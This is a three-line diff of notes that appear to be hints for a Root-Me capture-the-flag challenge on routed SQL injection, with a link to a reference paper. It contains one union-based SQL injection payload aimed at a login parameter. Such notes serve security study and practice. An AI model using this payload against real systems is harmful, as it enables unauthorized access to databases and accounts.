@@ -1,0 +1,3 @@
+- try the payload:login=1' union select 2-- -
+- think why??
+- http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt
